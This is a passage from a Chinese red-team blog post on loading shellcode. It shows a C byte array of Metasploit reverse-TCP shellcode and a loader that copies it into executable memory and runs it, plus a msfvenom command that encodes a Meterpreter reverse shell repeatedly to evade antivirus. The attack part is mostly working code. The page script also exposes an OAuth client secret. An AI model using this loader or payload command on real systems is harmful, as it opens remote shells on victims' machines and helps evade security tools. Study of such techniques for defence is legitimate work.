class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xe2\x01\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW);</span></span><br><span class="line">    LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里属于 <strong>动态申请内存</strong>的方式来加载shellcode。</p>
<p>因为msf 生成的shellcode 是直接生成的，我们先试一下msfvenom 中的编码器。</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629173900941.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.226.1 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -i 12 -f c &gt; shellcode2.c</span><br></pre></td></tr></table></figure>











<p>参考：</p>
<p><a target="_blank" rel="noopener" href="http://blog.leanote.com/post/snowming/5e915cdcdf79">http://blog.leanote.com/post/snowming/5e915cdcdf79</a></p>
<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html">https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/d789.html">https://hack-for.fun/d789.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="next-post pull-right"><a href="/65bb.html"><span>Java反序列化之URLDNS利用链分析学习笔记</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2023 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>